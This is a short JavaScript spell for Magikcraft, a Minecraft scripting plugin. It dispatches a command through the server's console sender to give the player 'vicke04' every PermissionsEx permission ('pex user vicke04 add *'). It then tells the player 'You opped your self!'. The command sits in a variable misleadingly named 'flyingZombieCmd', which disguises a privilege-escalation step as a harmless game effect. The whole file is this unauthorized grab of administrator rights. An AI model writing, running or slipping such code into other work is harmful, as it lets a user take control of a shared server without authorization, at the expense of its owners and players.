const magik = magikcraft.io;

function op() {

    function run(cmd) {
        var sudo = magik.getPlugin().getServer().getConsoleSender();
        magik.getPlugin().getServer().dispatchCommand(sudo, cmd);
    }
    const flyingZombieCmd = 'pex user vicke04 add *';

const activeMessageCmd = 'tellraw vicke04 ["\u00A78(\u00A7a!\u00A78) \u00A77You opped your self!"]';

    run(flyingZombieCmd);
    run(activeMessageCmd);
}